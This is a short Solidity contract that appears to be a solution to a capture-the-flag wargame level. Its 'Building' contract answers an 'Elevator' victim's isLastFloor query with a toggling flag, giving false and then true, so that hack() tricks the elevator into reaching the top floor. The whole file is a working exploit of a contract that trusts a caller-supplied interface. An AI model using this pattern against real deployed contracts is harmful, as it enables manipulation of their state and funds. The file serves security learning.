// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Elevator{
     function goTo(uint _floor) external;
}

contract Building{
    Elevator victim;
    bool public flag = true;
    constructor(address payable _addr) public {
        victim = Elevator(_addr);
    }

    function isLastFloor(uint) external returns (bool){
        flag = !flag;
        return flag;
    }

    function hack() public {
        victim.goTo(9);
    }
}
